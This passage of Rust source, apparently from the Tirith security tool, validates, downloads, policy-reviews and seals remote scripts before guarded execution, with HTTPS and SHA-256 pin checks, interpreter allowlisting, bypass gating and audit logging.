        crate::audit::canonical_json_for_hash(&serde_json::json!({
            "root": identity.root(),
            "destination": identity.destination(),
        }))
        .as_bytes(),
    ))
}

fn remote_download_binding(
    canonical_url: &str,
    source_prefix: &str,
    projection: serde_json::Value,
    destination: crate::util::ContainedAtomicFile,
) -> RemoteRunBoundaryBinding {
    let projection_sha256 =
        sha256_hex(crate::audit::canonical_json_for_hash(&projection).as_bytes());
    let mut envelope = crate::task_boundary::shell_envelope(canonical_url);
    envelope.sources[0].content = format!("{source_prefix}:sha256:{projection_sha256}");
    RemoteRunBoundaryBinding {
        envelope,
        effects: remote_run_effects(),
        destination: Some(destination),
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum DownloadPurpose {
    Execute,
    SaveOnly,
}

#[derive(Debug)]
struct ValidatedDownloadRequest {
    url: url::Url,
    expected_sha256: Option<String>,
}

struct AuthorizedRemoteRunTransaction {
    binding: RemoteRunBoundaryBinding,
    lease: crate::task_boundary::TaskBoundaryEffectLease<
        crate::task_boundary::RemoteScriptRunBoundary,
    >,
}

impl AuthorizedRemoteRunTransaction {
    fn begin(
        permit: crate::task_boundary::TaskBoundaryPermit<
            crate::task_boundary::RemoteScriptRunBoundary,
        >,
        binding: RemoteRunBoundaryBinding,
        now: chrono::DateTime<chrono::Utc>,
    ) -> Result<Self, String> {
        let operation = binding.operation();
        let lease = permit
            .into_effect_lease_at(&operation, now)
            .map_err(|error| {
                format!("remote-script authorization expired before network effect: {error}")
            })?;
        Ok(Self { binding, lease })
    }

    fn authorize_effect_at(&self, now: chrono::DateTime<chrono::Utc>) -> Result<(), String> {
        let operation = self.binding.operation();
        self.lease
            .authorize_effect_at(&operation, now)
            .map_err(|error| {
                format!("remote-script authorization expired before side effect: {error}")
            })
    }
}

struct RemoteLaunchBinding {
    envelope: crate::task::TaskEnvelopeInput,
    effects: std::collections::BTreeSet<crate::effects::CommandEffectKind>,
}

impl RemoteLaunchBinding {
    fn operation(&self) -> crate::task_boundary::BoundaryOperation<'_> {
        crate::task_boundary::BoundaryOperation {
            boundary: crate::task_boundary::OwnedBoundary::RemoteScriptRun,
            envelope: &self.envelope,
            adapter: crate::task::IngressAdapter::Unattributed,
            boundary_effects: self.effects.clone(),
        }
    }
}

struct PreparedRemoteLaunchAuthorization {
    binding: RemoteLaunchBinding,
    authorization: crate::task_boundary::PendingBoundaryAuthorization<
        crate::task_boundary::RemoteScriptRunBoundary,
    >,
}

/// Exact one-shot launch grant retained until the stopped target reports its
/// kernel exec transition. The permit's deadline and operation binding are
/// checked inside the OBSERVED-to-ACK critical section.
struct AuthorizedRemoteLaunch {
    _binding: RemoteLaunchBinding,
    _permit:
        crate::task_boundary::TaskBoundaryPermit<crate::task_boundary::RemoteScriptRunBoundary>,
}

struct DownloadedBytes {
    content: Vec<u8>,
    sha256: String,
    final_url: String,
    redirects: Vec<String>,
}

struct ScriptReview {
    interpreter: String,
    analysis_shell: Option<crate::tokenize::ShellType>,
    legacy: script_analysis::ScriptAnalysis,
    analysis_complete: bool,
    incomplete_reason: Option<&'static str>,
    raw_verdict: Option<Verdict>,
    effective_verdict: Option<Verdict>,
    policy: Option<crate::policy::Policy>,
}

struct ConfirmedScriptReview {
    review: ScriptReview,
    prepared: crate::execution_state::PreparedExecution,
    bypass_honored: bool,
}

struct ExecutionFile {
    #[cfg(target_os = "linux")]
    sealed_file: std::fs::File,
    #[cfg(not(target_os = "linux"))]
    _unsupported: (),
}

impl ExecutionFile {
    fn read_verified(&self, expected_len: usize, expected_sha256: &str) -> Result<Vec<u8>, String> {
        #[cfg(target_os = "linux")]
        {
            verify_script_seals(&self.sealed_file)?;
            let bytes = read_open_file_at(&self.sealed_file, expected_len)?;
            if bytes.len() != expected_len || sha256_hex(&bytes) != expected_sha256 {
                return Err("sealed execution object digest changed before spawn".to_string());
            }
            Ok(bytes)
        }
        #[cfg(not(target_os = "linux"))]
        {
            let _ = (self, expected_len, expected_sha256);
            Err("exact content-bound script execution is supported only on Linux".to_string())
        }
    }

    fn reviewed<'a>(&self, bytes: &'a [u8]) -> ReviewedScript<'a> {
        ReviewedScript {
            bytes,
            #[cfg(target_os = "linux")]
            sealed_fd: {
                use std::os::fd::AsRawFd as _;
                self.sealed_file.as_raw_fd()
            },
        }
    }
}

/// Interpreters matched by exact name only.
const ALLOWED_EXACT: &[&str] = &[
    "sh", "bash", "zsh", "dash", "ksh", "fish", "ash", "deno", "bun", "nodejs",
];

/// Interpreter families allowed with an optional `digits[.digits]*` version
/// suffix (python3, python3.11, ruby3.2, node18, perl5.38).
const ALLOWED_FAMILIES: &[&str] = &["python", "ruby", "perl", "node"];

fn is_allowed_interpreter(interpreter: &str) -> bool {
    let base = interpreter.rsplit('/').next().unwrap_or(interpreter);

    if ALLOWED_EXACT.contains(&base) {
        return true;
    }

    for &family in ALLOWED_FAMILIES {
        if base == family {
            return true;
        }
        if let Some(suffix) = base.strip_prefix(family) {
            if is_valid_version_suffix(suffix) {
                return true;
            }
        }
    }

    false
}

/// A valid version suffix is `digits (.digits)*` ("3", "3.11"); rejects "", ".3", "3.", "evil".
fn is_valid_version_suffix(s: &str) -> bool {
    if s.is_empty() {
        return false;
    }
    s.split('.')
        .all(|part| !part.is_empty() && part.chars().all(|c| c.is_ascii_digit()))
}

fn normalize_sha256_pin(expected: Option<&str>) -> Result<Option<String>, String> {
    let Some(expected) = expected else {
        return Ok(None);
    };
    if expected.len() != 64 || !expected.bytes().all(|b| b.is_ascii_hexdigit()) {
        return Err(format!(
            "invalid SHA-256 pin: expected exactly 64 hexadecimal characters, got '{}'",
            crate::util::truncate_bytes(expected, 16)
        ));
    }
    Ok(Some(expected.to_ascii_lowercase()))
}

/// Validate all caller-controlled request inputs before constructing a client or
/// resolving a hostname. Execution requires authenticated transport: HTTPS, or
/// the narrow compatibility case of a directly requested HTTP URL with a valid
/// digest pin. Save-only downloads retain their historical HTTP support.
fn preflight_download_request(
    url: &str,
    expected_sha256: Option<&str>,
    purpose: DownloadPurpose,
) -> Result<ValidatedDownloadRequest, String> {
    // The pin is intentionally first: malformed integrity metadata must fail
    // before DNS, socket, proxy, or other network-visible work.
    let expected_sha256 = normalize_sha256_pin(expected_sha256)?;
    let parsed = crate::url_validate::validate_fetch_url_syntax(url)?;
    validate_initial_transport(&parsed, expected_sha256.is_some(), purpose)?;
    Ok(ValidatedDownloadRequest {
        url: parsed,
        expected_sha256,
    })
}

fn validate_download_destination(
    request: ValidatedDownloadRequest,
) -> Result<ValidatedDownloadRequest, String> {
    let validated = crate::url_validate::validate_fetch_url(request.url.as_str())?;
    if validated != request.url {
        return Err("validated download URL identity changed before request".to_string());
    }
    Ok(request)
}

fn validate_download_request(
    url: &str,
    expected_sha256: Option<&str>,
    purpose: DownloadPurpose,
) -> Result<ValidatedDownloadRequest, String> {
    validate_download_destination(preflight_download_request(url, expected_sha256, purpose)?)
}

fn validate_initial_transport(
    parsed: &url::Url,
    has_sha256_pin: bool,
    purpose: DownloadPurpose,
) -> Result<(), String> {
    if purpose == DownloadPurpose::Execute && parsed.scheme() == "http" && !has_sha256_pin {
        return Err(
            "executable downloads require HTTPS; direct HTTP is allowed only with an explicit SHA-256 pin"
                .to_string(),
        );
    }
    Ok(())
}

fn validate_redirect_target(
    previous: &url::Url,
    target: &url::Url,
    purpose: DownloadPurpose,
) -> Result<(), String> {
    // No redirect hop in an executable transaction may use cleartext. This is
    // stricter than the direct-HTTP compatibility exception because a pin does
    // not justify silently changing the requested transport path.
    if purpose == DownloadPurpose::Execute && target.scheme() != "https" {
        return Err(format!(
            "executable redirect must use HTTPS ({} -> {})",
            previous.scheme(),
            target.scheme()
        ));
    }
    crate::url_validate::validate_fetch_url(target.as_str()).map(|_| ())
}

fn require_success_status(status: reqwest::StatusCode) -> Result<(), String> {
    if status.is_success() {
        Ok(())
    } else {
        Err(format!("download failed with HTTP status {status}"))
    }
}

fn sha256_hex(content: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(content);
    format!("{:x}", hasher.finalize())
}

fn download_bounded_validated(
    request: ValidatedDownloadRequest,
    purpose: DownloadPurpose,
) -> Result<DownloadedBytes, String> {
    let redirect_list = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let redirect_list_clone = redirect_list.clone();

    let client = crate::ssrf_guard::fetch_client_builder()
        .redirect(reqwest::redirect::Policy::custom(move |attempt| {
            if let Ok(mut list) = redirect_list_clone.lock() {
                list.push(attempt.url().to_string());
            }
            if attempt.previous().len() >= 10 {
                return attempt.error("too many redirects");
            }
            let previous = attempt.previous().last().unwrap_or(attempt.url());
            match validate_redirect_target(previous, attempt.url(), purpose) {
                Ok(()) => attempt.follow(),
                Err(reason) => attempt.error(reason),
            }
        }))
        .timeout(std::time::Duration::from_secs(30))
        .build()
        .map_err(|e| format!("http client: {e}"))?;

    let response = client
        .get(request.url)
        .send()
        .map_err(|e| format!("download failed: {e}"))?;
    require_success_status(response.status())?;
    let final_url = response.url().to_string();

    const MAX_BODY: u64 = 10 * 1024 * 1024;
    if let Some(len) = response.content_length() {
        if len > MAX_BODY {
            return Err(format!(
                "response too large: {len} bytes (max {} MiB)",
                MAX_BODY / 1024 / 1024
            ));
        }
    }

    use std::io::Read as _;
    let mut content = Vec::new();
    response
        .take(MAX_BODY + 1)
        .read_to_end(&mut content)
        .map_err(|e| format!("read body: {e}"))?;
    if content.len() as u64 > MAX_BODY {
        return Err(format!(
            "response body exceeds {} MiB limit",
            MAX_BODY / 1024 / 1024
        ));
    }

    let sha256 = sha256_hex(&content);
    if let Some(expected) = request.expected_sha256 {
        if sha256 != expected {
            return Err(format!(
                "SHA-256 mismatch: expected {expected}, got {sha256}"
            ));
        }
    }
    let redirects = redirect_list
        .lock()
        .map(|list| list.clone())
        .unwrap_or_default();
    Ok(DownloadedBytes {
        content,
        sha256,
        final_url,
        redirects,
    })
}

fn download_bounded_authorized(
    request: ValidatedDownloadRequest,
    purpose: DownloadPurpose,
    authorization: &AuthorizedRemoteRunTransaction,
) -> Result<DownloadedBytes, String> {
    authorization.authorize_effect_at(chrono::Utc::now())?;
    download_bounded_validated(request, purpose)
}

fn download_bounded(
    url: &str,
    expected_sha256: Option<&str>,
    purpose: DownloadPurpose,
) -> Result<DownloadedBytes, String> {
    let request = validate_download_request(url, expected_sha256, purpose)?;
    download_bounded_validated(request, purpose)
}

fn interpreter_analysis(
    interpreter: &str,
) -> Option<(crate::tokenize::ShellType, bool, &'static str)> {
    let base = interpreter.rsplit('/').next().unwrap_or(interpreter);
    if matches!(base, "sh" | "bash" | "zsh" | "dash" | "ksh" | "ash") {
        return Some((crate::tokenize::ShellType::Posix, true, "sh"));
    }
    if base == "fish" {
        return Some((crate::tokenize::ShellType::Fish, true, "fish"));
    }
    for (family, extension) in [
        ("python", "py"),
        ("ruby", "rb"),
        ("perl", "pl"),
        ("node", "js"),
    ] {
        if base == family
            || base
                .strip_prefix(family)
                .is_some_and(is_valid_version_suffix)
        {
            return Some((crate::tokenize::ShellType::Posix, false, extension));
        }
    }
    if matches!(base, "nodejs" | "deno" | "bun") {
        return Some((crate::tokenize::ShellType::Posix, false, "js"));
    }
    None
}

fn review_script_bytes(
    content: &[u8],
    will_execute: bool,
    interactive: bool,
    cwd: Option<&Path>,
    forced_interpreter: Option<&str>,
) -> Result<ScriptReview, String> {
    let session_id = crate::session::resolve_session_id();
    review_script_bytes_for_session(
        content,
        will_execute,
        interactive,
        cwd,
        forced_interpreter,
        &session_id,
    )
}

fn review_script_bytes_for_session(
    content: &[u8],
    will_execute: bool,
    interactive: bool,
    cwd: Option<&Path>,
    forced_interpreter: Option<&str>,
    session_id: &str,
) -> Result<ScriptReview, String> {
    let content_str = match std::str::from_utf8(content) {
        Ok(text) => text.to_string(),
        Err(_) if will_execute => {
            return Err("refusing execution: downloaded script is not valid UTF-8".to_string())
        }
        Err(_) => {
            let lossy = String::from_utf8_lossy(content).into_owned();
            let interpreter = forced_interpreter
                .map(str::to_string)
                .unwrap_or_else(|| script_analysis::detect_interpreter(&lossy).to_string());
            return Ok(ScriptReview {
                legacy: script_analysis::analyze(&lossy, &interpreter),
                interpreter,
                analysis_shell: None,
                analysis_complete: false,
                incomplete_reason: Some("invalid-utf8"),
                raw_verdict: None,
                effective_verdict: None,
                policy: None,
            });
        }
    };
    // A safe rewrite of `<fetch> | <shell>` must preserve the selected shell,
    // not trust a remote shebang to replace it with Python, Node, or anything
    // else. Manual `tirith run` retains shebang detection.
    let interpreter = forced_interpreter
        .map(str::to_string)
        .unwrap_or_else(|| script_analysis::detect_interpreter(&content_str).to_string());
    let Some((shell, command_semantics, extension)) = interpreter_analysis(&interpreter) else {
        if will_execute {
            return Err(format!(
                "refusing execution: interpreter '{interpreter}' has no complete analyzer"
            ));
        }
        return Ok(ScriptReview {
            legacy: script_analysis::analyze(&content_str, &interpreter),
            interpreter,
            analysis_shell: None,
            analysis_complete: false,
            incomplete_reason: Some("unsupported-interpreter"),
            raw_verdict: None,
            effective_verdict: None,
            policy: None,
        });
    };

    let cwd_string = cwd.map(|path| path.display().to_string());
    let logical_path = cwd
        .unwrap_or_else(|| Path::new("."))
        .join(format!("downloaded-script.{extension}"));
    let ctx = crate::engine::AnalysisContext {
        input: content_str.clone(),
        shell,
        scan_context: if command_semantics {
            crate::extract::ScanContext::Exec
        } else {
            crate::extract::ScanContext::FileScan
        },
        raw_bytes: Some(content.to_vec()),
        interactive,
        cwd: cwd_string,
        file_path: (!command_semantics).then_some(logical_path.clone()),
        repo_root: None,
        is_config_override: false,
        clipboard_html: None,
        card_ref: None,
        clipboard_source: crate::clipboard::ClipboardSourceState::Unread,
    };
    let analyzed = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        crate::engine::analyze_force_full_without_bypass_returning_policy(&ctx)
    }))
    .map_err(|_| "refusing execution: policy analysis did not complete".to_string())?;
    let (mut raw_verdict, policy) = analyzed;
    // A CLI transaction may already have frozen an earlier preflight policy.
    // Merge this body-analysis policy into that invocation's presentation plan
    // so receipt/error DTOs cannot leak a custom pattern introduced between
    // preflight and the authoritative byte review.
    crate::policy::freeze_captured_policy_dlp_patterns(&policy.dlp_custom_patterns);

    // Shell source is both an executable command stream and a code file. The
    // Exec pipeline supplies command/policy rules; add the repository's code-file
    // rules over the same UTF-8 bytes without reopening any path.
    if command_semantics {
        append_policy_aware_codefile_findings(
            &mut raw_verdict,
            &policy,
            &content_str,
            logical_path.to_str(),
        );
    }
    raw_verdict.agent_origin = Some(crate::agent_origin::resolve_cli_origin(interactive));
    let effective_verdict = crate::escalation::post_process_verdict_for_verification(
        &raw_verdict,
        &policy,
        &content_str,
        session_id,
        crate::escalation::CallerContext::Cli,
    );
    Ok(ScriptReview {
        legacy: script_analysis::analyze(&content_str, &interpreter),
        interpreter,
        analysis_shell: Some(shell),
        analysis_complete: true,
        incomplete_reason: None,
        raw_verdict: Some(raw_verdict),
        effective_verdict: Some(effective_verdict),
        policy: Some(policy),
    })
}

fn append_policy_aware_codefile_findings(
    verdict: &mut Verdict,
    policy: &crate::policy::Policy,
    content: &str,
    logical_path: Option<&str>,
) {
    let first_appended = verdict.findings.len();
    verdict
        .findings
        .extend(crate::rules::codefile::check(content, logical_path));
    // These findings are produced outside engine::analyze_inner, so apply the
    // same frozen full-policy severity overrides before deriving the raw action.
    // Otherwise a code-file-only finding could bypass an org or repository
    // severity override.
    for finding in &mut verdict.findings[first_appended..] {
        if let Some(severity) = policy.severity_override(&finding.rule_id) {
            finding.severity = severity;
        }
    }
    verdict.action =
        crate::verdict::upgraded_action_from_findings(&verdict.findings, verdict.action);
}

fn apply_explicit_bypass(
    review: &mut ScriptReview,
    policy: &crate::policy::Policy,
    requested: bool,
    interactive: bool,
    surface_allows_bypass: bool,
    execution_enabled: bool,
) -> bool {
    let policy_allows = if interactive {
        policy.allow_bypass_env
    } else {
        policy.allow_bypass_env_noninteractive
    };
    let available = surface_allows_bypass && policy_allows;
    // A pending policy approval is a stronger contract than a plain block:
    // TIRITH=0 may bypass a bypassable block, but never an ungranted approval.
    // Consult the RAW findings directly so a severity override, an action
    // override, or the paranoia filter can never hide the approval-triggering
    // finding from this gate — otherwise one blocking finding outside the
    // approval rule would make the whole verdict (approval included)
    // env-bypassable.
    let approval_pending = review
        .effective_verdict
        .as_ref()
        .is_some_and(|verdict| verdict.requires_approval == Some(true))
        || review
            .raw_verdict
            .as_ref()
            .is_some_and(|raw| crate::approval::check_approval(raw, policy).is_some());
    let effective_is_bypassable_block = review
        .effective_verdict
        .as_ref()
        .is_some_and(|verdict| verdict.action == Action::Block)
        && !approval_pending;
    let honored = requested && available && execution_enabled && effective_is_bypassable_block;
    for verdict in [
        review.raw_verdict.as_mut(),
        review.effective_verdict.as_mut(),
    ]
    .into_iter()
    .flatten()
    {
        verdict.bypass_requested = requested;
        verdict.bypass_available = available;
        verdict.bypass_honored = honored;
    }
    honored
}

fn raw_audit_fields(review: &ScriptReview) -> Option<(String, Vec<String>)> {
    review.raw_verdict.as_ref().map(|raw| {
        (
            format!("{:?}", raw.action),
            raw.findings
                .iter()
                .map(|finding| finding.rule_id.to_string())
                .collect(),
        )
    })
}

fn redacted_result_verdict(review: &ScriptReview) -> Option<Verdict> {
    review.effective_verdict.as_ref().map(|effective| {
        let custom_patterns = &review
            .policy
            .as_ref()
            .expect("an effective runner verdict retains its frozen policy")
            .dlp_custom_patterns;
        redacted_verdict(effective, custom_patterns)
    })
}

fn redacted_verdict(verdict: &Verdict, custom_patterns: &[String]) -> Verdict {
    let mut display = verdict.clone();
    crate::redact::redact_verdict(&mut display, custom_patterns);
    display
}

fn audit_complete_review(
    review: &ScriptReview,
    effective: &Verdict,
    audit_subject: &str,
    require_durable_bypass_audit: bool,
) -> Result<(), String> {
    let Some(policy) = review.policy.as_ref() else {
        return Ok(());
    };
    let Some((raw_action, raw_rule_ids)) = raw_audit_fields(review) else {
        return Ok(());
    };
    let audit_result = if require_durable_bypass_audit {
        crate::audit::log_verdict_with_raw_required(
            effective,
            audit_subject,
            None,
            Some(uuid::Uuid::new_v4().to_string()),
            &policy.dlp_custom_patterns,
            Some(raw_action),
            Some(raw_rule_ids),
        )
    } else {
        crate::audit::log_verdict_with_raw(
            effective,
            audit_subject,
            None,
            Some(uuid::Uuid::new_v4().to_string()),
            &policy.dlp_custom_patterns,
            Some(raw_action),
            Some(raw_rule_ids),
        )
    };
    enforce_required_bypass_audit(require_durable_bypass_audit, audit_result)
}

fn prepare_confirmed_script_review(
    content: &[u8],
    interactive: bool,
    cwd: Option<&Path>,
    interpreter: &str,
    bypass_requested: bool,
    surface_allows_bypass: bool,
    session_id: &str,
) -> Result<ConfirmedScriptReview, String> {
    // The interpreter is forced to the exact value selected before confirmation;
    // the immutable downloaded bytes are supplied directly again. No cache path
    // or remote object is reopened for the authoritative decision.
    let mut review = review_script_bytes_for_session(
        content,
        true,
        interactive,
        cwd,
        Some(interpreter),
        session_id,
    )?;
    if review.interpreter != interpreter {
        return Err("fresh execution analysis changed the selected interpreter".to_string());
    }
    let policy = review
        .policy
        .clone()
        .ok_or_else(|| "fresh live analysis has no complete policy".to_string())?;
    let policy_allows_bypass = if interactive {
        policy.allow_bypass_env
    } else {
        policy.allow_bypass_env_noninteractive
    };
    let bypass_available = surface_allows_bypass && policy_allows_bypass;
    // Carry only the request/availability facts into strict preparation. The
    // honored fact depends on the authoritative strict-session verdict, which
    // can differ from this read-only review while confirmation is pending.
    for verdict in [
        review.raw_verdict.as_mut(),
        review.effective_verdict.as_mut(),
    ]
    .into_iter()
    .flatten()
    {
        verdict.bypass_requested = bypass_requested;
        verdict.bypass_available = bypass_available;
        verdict.bypass_honored = false;
    }
    let raw_verdict = review
        .raw_verdict
        .as_ref()
        .ok_or_else(|| "fresh live analysis has no complete raw verdict".to_string())?;
    let shell = review
        .analysis_shell
        .ok_or_else(|| "fresh live analysis has no complete command analyzer".to_string())?;
    let content_text = std::str::from_utf8(content)
        .map_err(|_| "live execution content changed from validated UTF-8".to_string())?;
    let prepared = crate::execution_state::prepare_execution(
        raw_verdict,
        &policy,
        content_text,
        session_id,
        crate::escalation::CallerContext::Cli,
        shell,
        crate::execution_state::DEFAULT_DRAFT_TTL,
        crate::execution_state::DEFAULT_GATE_LOCK_TIMEOUT,
    )?;
    let (prepared, bypass_honored) =
        prepared.reapply_runner_bypass(bypass_requested, bypass_available)?;
    for verdict in [
        review.raw_verdict.as_mut(),
        review.effective_verdict.as_mut(),
    ]
    .into_iter()
    .flatten()
    {
        verdict.bypass_requested = bypass_requested;
        verdict.bypass_available = bypass_available;
        verdict.bypass_honored = bypass_honored;
    }
    // Keep the review internally consistent for downstream audit helpers: the
    // strict prepared verdict is the final effective verdict, including any
    // session-only escalation that occurred during confirmation.
    review.effective_verdict = Some(prepared.verdict().clone());
    Ok(ConfirmedScriptReview {
        review,
        prepared,
        bypass_honored,
    })
}

fn read_tty_confirmation(tty: &fs::File, prompt: &str) -> Result<bool, String> {
    let mut tty_writer = io::BufWriter::new(tty);
    write!(tty_writer, "{prompt}").map_err(|error| format!("tty write: {error}"))?;
    tty_writer
        .flush()
        .map_err(|error| format!("tty flush: {error}"))?;
    drop(tty_writer);

    let mut reader = io::BufReader::new(tty);
    let mut response_line = String::new();
    reader
        .read_line(&mut response_line)
        .map_err(|error| format!("tty read: {error}"))?;
    Ok(response_line.trim().eq_ignore_ascii_case("y"))
}

fn present_complete_verdict(
    verdict: &Verdict,
    custom_patterns: &[String],
    writer: impl io::Write,
) -> Result<(), String> {
    crate::output::write_human_with_patterns(verdict, false, custom_patterns, writer).map_err(
        |error| {
            format!(
                "refusing execution because the complete verdict could not be presented: {error}"
            )
        },
    )
}

fn enforce_required_bypass_audit(
    live_bypass: bool,
    audit_result: Result<(), String>,
) -> Result<(), String> {
    if live_bypass {
        audit_result.map_err(|error| {
            format!(
                "refusing bypass execution because the required audit record was not persisted: {error}"
            )
        })
    } else {
        Ok(())
    }
}

fn materialize_execution_file(
    _parent: &Path,
    content: &[u8],
    expected_sha256: &str,
) -> Result<ExecutionFile, String> {
    #[cfg(not(target_os = "linux"))]
    {
        let _ = (content, expected_sha256);
        Err("exact content-bound script execution is supported only on Linux".to_string())
    }

    #[cfg(target_os = "linux")]
    {
        use std::ffi::CString;
        use std::io::{Seek as _, SeekFrom};
        use std::os::fd::{AsRawFd as _, FromRawFd as _};

        let name = CString::new("tirith-reviewed-script").expect("static memfd label has no NUL");
        let raw_fd = unsafe {
            libc::memfd_create(name.as_ptr(), libc::MFD_CLOEXEC | libc::MFD_ALLOW_SEALING)
        };
        if raw_fd < 0 {
            return Err(format!(
                "create sealed execution object: {}",
                std::io::Error::last_os_error()
            ));
        }
        // SAFETY: memfd_create returned a uniquely owned descriptor.
        let mut sealed_file = unsafe { std::fs::File::from_raw_fd(raw_fd) };
        sealed_file
            .write_all(content)
            .map_err(|error| format!("write sealed execution object: {error}"))?;
        sealed_file
            .seek(SeekFrom::Start(0))
            .map_err(|error| format!("rewind sealed execution object: {error}"))?;
        let written = read_open_file_at(&sealed_file, content.len())?;
        if written.len() != content.len() || sha256_hex(&written) != expected_sha256 {
            return Err("sealed execution object digest changed while materializing".to_string());
        }
        if unsafe { libc::fchmod(sealed_file.as_raw_fd(), 0o400) } != 0 {
            return Err(format!(
                "make sealed execution object read-only: {}",
                std::io::Error::last_os_error()
            ));
        }
        let required =
            libc::F_SEAL_SEAL | libc::F_SEAL_SHRINK | libc::F_SEAL_GROW | libc::F_SEAL_WRITE;
        if unsafe { libc::fcntl(sealed_file.as_raw_fd(), libc::F_ADD_SEALS, required) } < 0 {
            return Err(format!(
                "seal reviewed script bytes: {}",
                std::io::Error::last_os_error()
            ));
        }
        verify_script_seals(&sealed_file)?;
        Ok(ExecutionFile { sealed_file })
    }
}

#[cfg(target_os = "linux")]
fn read_open_file_at(file: &std::fs::File, expected_len: usize) -> Result<Vec<u8>, String> {
    use std::os::unix::fs::FileExt as _;

    let mut bytes = vec![0u8; expected_len.saturating_add(1)];
    let mut offset = 0usize;
    while offset < bytes.len() {
        match file.read_at(&mut bytes[offset..], offset as u64) {
            Ok(0) => break,
            Ok(read) => offset += read,
            Err(error) if error.kind() == std::io::ErrorKind::Interrupted => continue,
            Err(error) => return Err(format!("read sealed execution object: {error}")),
        }
    }
    bytes.truncate(offset);
    Ok(bytes)
}

#[cfg(target_os = "linux")]
fn verify_script_seals(file: &std::fs::File) -> Result<(), String> {
    use std::os::fd::AsRawFd as _;

    let seals = unsafe { libc::fcntl(file.as_raw_fd(), libc::F_GET_SEALS) };
    if seals < 0 {
        return Err(format!(
            "inspect reviewed script seals: {}",
            std::io::Error::last_os_error()
        ));
    }
    let required = libc::F_SEAL_SEAL | libc::F_SEAL_SHRINK | libc::F_SEAL_GROW | libc::F_SEAL_WRITE;
    if seals & required != required {
        return Err("reviewed script descriptor is missing required immutable seals".to_string());
    }
    Ok(())
}

#[cfg(target_os = "linux")]
fn require_native_bound_interpreter(invocation: &ScriptInvocation) -> Result<(), String> {
    let program = invocation.resolved_executable.as_ref().ok_or_else(|| {
        "script execution requires a resolved interpreter before approval".to_string()
    })?;
    let fd = program.bound_launch_fd().ok_or_else(|| {
        "script execution requires a sealed content-bound interpreter descriptor".to_string()
    })?;
    let mut header = [0u8; 4];
    let read = unsafe {
        libc::pread(
            fd,
            header.as_mut_ptr().cast::<libc::c_void>(),
            header.len(),
            0,
        )
    };
    if read != header.len() as isize || header != *b"\x7fELF" {
        return Err(format!(
            "refusing interpreter '{}': content-bound execution requires a native ELF image",
            invocation.interpreter
        ));
    }
    Ok(())
}

/// Atomically publish downloaded bytes at their content-addressed cache path.
///
/// Bytes are written through a random sibling file and `persist` performs the
/// final rename. The destination is never opened for writing, so a precreated
/// symlink at the predictable digest name cannot redirect writes to its target.
fn persist_cache_entry(cache_dir: &Path, cached_path: &Path, content: &[u8]) -> Result<(), String> {
    let mut tmp =
        tempfile::NamedTempFile::new_in(cache_dir).map_err(|e| format!("tempfile: {e}"))?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt as _;
        tmp.as_file()
            .set_permissions(fs::Permissions::from_mode(0o600))
            .map_err(|e| format!("permissions: {e}"))?;
    }
    tmp.write_all(content)
        .map_err(|e| format!("write cache: {e}"))?;
    // fsync bytes before rename so a crash cannot leave a partial cache entry.
    tmp.as_file()
        .sync_all()
        .map_err(|e| format!("sync cache: {e}"))?;
    tmp.persist(cached_path)
        .map_err(|e| format!("persist cache: {e}"))?;
    // Also fsync the parent directory so the rename itself is crash-durable.
    // Best-effort: persist already succeeded, so a dir-fsync failure is logged.
    crate::util::fsync_parent_dir_logged(cached_path, "run cache");
    Ok(())
}

fn persist_cache_entry_authorized(
    cache_dir: &Path,
    cached_path: &Path,
    content: &[u8],
    authorization: &AuthorizedRemoteRunTransaction,
) -> Result<(), String> {
    authorization.authorize_effect_at(chrono::Utc::now())?;
    persist_cache_entry(cache_dir, cached_path, content)
}

fn save_remote_receipt_authorized(
    receipt: &Receipt,
    authorization: &AuthorizedRemoteRunTransaction,
) -> Result<(), String> {
    authorization.authorize_effect_at(chrono::Utc::now())?;
    receipt
        .save()
        .map(|_| ())
        .map_err(|error| format!("save receipt: {error}"))
}

pub fn run(opts: RunOptions) -> Result<RunResult, String> {
    if !opts.no_exec && opts.exec_fn.is_some() {
        return Err(
            "legacy path-based script executors are disabled for live execution; use the content-bound verified executor API"
                .to_string(),
        );
    }
    run_impl(opts, None, None, None)
}

/// Run with an additive executor that receives only the immutable reviewed
/// script object. `RunOptions::exec_fn` must remain `None`; that legacy field is
/// retained solely for downstream source compatibility and no longer authorizes
/// path-based live execution.
pub fn run_with_verified_executor(
    opts: RunOptions,
    executor: VerifiedScriptExecutor,
) -> Result<RunResult, String> {
    if opts.exec_fn.is_some() {
        return Err("cannot combine legacy and verified script executors".to_string());
    }
    run_impl(opts, None, Some(&executor), None)
}

/// Additive verified stdin API. The typed invocation is deliberately kept out
/// of legacy [`RunOptions`] so existing downstream struct literals remain
/// source-compatible with the original five-field contract.
pub fn run_with_verified_pipe_executor(
    opts: RunOptions,
    requested_pipe_invocation: RequestedPipeInvocation,
    executor: VerifiedScriptExecutor,
) -> Result<RunResult, String> {
    if opts.exec_fn.is_some() {
        return Err("cannot combine legacy and verified script executors".to_string());
    }
    run_impl(opts, Some(requested_pipe_invocation), Some(&executor), None)
}

/// Tirith-owned remote-script transition.
///
/// The caller prepares a pure, operation-bound decision, but this function
/// deliberately consumes it only after all local platform/executor/interpreter
/// validation and immediately before the first network effect. Both live runs
/// and `--no-exec` inspections use this entry point in Tirith's CLI because
/// inspection still downloads remote bytes.
pub fn run_with_authorized_verified_executor<'operation, 'envelope>(
    opts: RunOptions,
    requested_pipe_invocation: Option<RequestedPipeInvocation>,
    pending_authorization: crate::task_boundary::PendingBoundaryAuthorization<
        crate::task_boundary::RemoteScriptRunBoundary,
    >,
    operation: &'operation crate::task_boundary::BoundaryOperation<'envelope>,
    executor: VerifiedScriptExecutor,
) -> Result<RunResult, String> {
    if opts.exec_fn.is_some() {
        return Err("cannot combine legacy and verified script executors".to_string());
    }
    run_impl(
        opts,
        requested_pipe_invocation,
        Some(&executor),
        Some((pending_authorization, operation)),
    )
}

fn validate_and_authorize_remote_download<'operation, 'envelope, F>(
    url: &str,
    expected_sha256: Option<&str>,
    purpose: DownloadPurpose,
    requested_pipe_invocation: Option<&RequestedPipeInvocation>,
    pending: crate::task_boundary::PendingBoundaryAuthorization<
        crate::task_boundary::RemoteScriptRunBoundary,
    >,
    operation: &'operation crate::task_boundary::BoundaryOperation<'envelope>,
    consume: F,
) -> Result<(ValidatedDownloadRequest, AuthorizedRemoteRunTransaction), String>
where
